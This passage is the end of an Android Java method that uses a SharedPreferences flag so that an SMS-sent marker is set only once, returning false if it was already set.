        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.SHARED_PREFERENCE_SMS_SENT, 0);
        SharedPreferences.Editor editorEdit = sharedPreferences.edit();
        if (sharedPreferences.getInt(Constants.KEY_SMS_SENT_ALREADY, 0) != 0) {
            return false;
        }
        editorEdit.putInt(Constants.KEY_SMS_SENT_ALREADY, 1);
        editorEdit.commit();
        return true;
    }
}
